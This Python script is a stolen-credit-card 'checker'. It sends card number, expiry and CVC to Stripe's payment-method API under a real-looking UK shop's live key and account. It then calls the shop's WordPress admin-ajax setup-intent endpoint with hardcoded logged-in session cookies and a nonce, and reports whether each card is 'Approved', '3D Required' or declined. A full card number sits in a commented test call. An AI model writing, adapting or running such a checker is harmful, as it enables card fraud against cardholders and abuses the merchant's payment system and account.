import requests,re
import requests
import time
import re
import random
def au(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = f'billing_details[name]=+&billing_details[email]=ficada8620%40baxidy.com&billing_details[address][country]=YE&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F93bc6d7bcf%3B+stripe-js-v3%2F93bc6d7bcf%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fjohnnysbackyard.co.uk&time_on_page=19291&client_attribution_metadata[client_session_id]=9a66b91a-d95e-47c0-b9c9-4f1b670f2579&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=36c1aa8b-3cc8-45c7-9b52-519006033c54&guid=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&muid=06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84&sid=bef04f2f-dc04-4c10-af00-408887d909d31da700&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1KQW8K2ENjnX48AP'




    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        
    #print(response.text)
    response_data = response.json()  # Parse the response as JSON

    if 'error' in response_data:
        error_code = response_data['error']['code']
        if error_code == 'incorrect_number':
            return "Card number invalid 404"
        elif error_code == 'invalid_expiry_year':
            return "card expire invalid 909"
        else:
            print("An error occurred:", response_data['error']['message'])
            return response_data['error']['message']
    else:
        
        response_json = response.json()
        id = response_json.get('id', 'No id found')
        print(f"Payment source created successfully. ID: {id}") 
        
        


    cookies = {
    'wordpress_sec_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759938679%7CWnQYpRLAKr2NqG8o0ZFxX8mxx7l4BNxMMAIL6gA22AF%7C0f6b0d25ac8c58000d98327ce6d7f34d2499c1fe8cc952dbff79c97df4a9c23a',
    '__stripe_mid': '06d318d0-c3a6-413d-94b6-4e891be1aa7b8c7f84',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-09-24%2015%3A19%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fpayment-methods%2F',
    'sbjs_first_add': 'fd%3D2025-09-24%2015%3A19%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fpayment-methods%2F',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'PHPSESSID': 'vms1gakr1pdoqv7g1ahk07skel',
    'wordpress_logged_in_770c706eea1236171dc55a3d679b65cf': 'ficada8620%7C1759938679%7CWnQYpRLAKr2NqG8o0ZFxX8mxx7l4BNxMMAIL6gA22AF%7Cdad3d97bdf9a1a2ea2c1b4ce3fca86d8aee044b3bb5245efc3288b6793fb92bd',
    'mcfw-wp-user-cookie': 'NzI3fDB8NjN8Njc4XzFhOTZhNWIwZTRjMTVjYjcwZTQzZWYzN2ZlYzllYjA3M2M1MTUwZTYwNDI4N2VlNzUwMDZkMzU2MjkzYTRhZDg%3D',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjohnnysbackyard.co.uk%2Fmy-account%2Fadd-payment-method%2F',
    '__stripe_sid': '7f45f0f8-665a-4432-8f0d-96e3b70c378db19f46',
}

    headers = {
    'authority': 'johnnysbackyard.co.uk',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
    'referer': 'https://johnnysbackyard.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    files = {
    'action': (None, 'create_setup_intent'),
    'wcpay-payment-method': (None, id),
    '_ajax_nonce': (None, '546d9fbe77'),
}

    response = requests.post('https://johnnysbackyard.co.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, files=files)        
    
    #print(response.text)

    data = response.json()
    main_data = data.get('data', {})
    status = main_data.get('status')

    if data.get('success') == True and status == 'succeeded':
      #  print("Approved")
        return "Approved"
    elif data.get('success') == True and status == 'requires_action':
       # print("3D Required")
        return "3D Required"
    else:
        message = data.get("data", {}).get("error", {}).get("message", "")
        if "declined" in message.lower():
          #  print("Card was Declined")
            return "Card was Declined"
        else:
          #  print("Message:", message)
            return message
    
            
        
#print(au("4895040585291392|10|27|511"))              